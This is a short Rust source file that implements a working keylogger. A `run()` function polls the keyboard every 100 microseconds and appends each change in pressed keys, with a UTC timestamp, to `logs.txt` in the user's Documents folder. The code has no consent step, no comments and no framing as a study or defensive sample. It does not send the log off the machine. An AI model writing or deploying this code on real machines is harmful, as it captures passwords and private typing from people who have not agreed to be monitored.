use device_query::{DeviceQuery, DeviceState};
use chrono::prelude::*;
use std::{fs::File, io::Write};
use std::thread;
use std::time::Duration;

pub fn run() {
    let device_state = DeviceState::new();
    let mut prev_keys = vec![];

    let path = std::env::var("USERPROFILE").unwrap_or(".".to_string()) + "\\Documents\\";
    let fp = path + "logs.txt";
    let mut file = File::create(fp).expect("Couldn't create log file");
    

    loop {
        let local = Utc::now();
        let keys = device_state.get_keys();

        if keys != prev_keys && !keys.is_empty() {
            writeln!(file, "{:?} Keyboard: {:?}", local, keys).expect("msg");
        }

        prev_keys = keys;
        
        thread::sleep(Duration::from_micros(100));
    }
}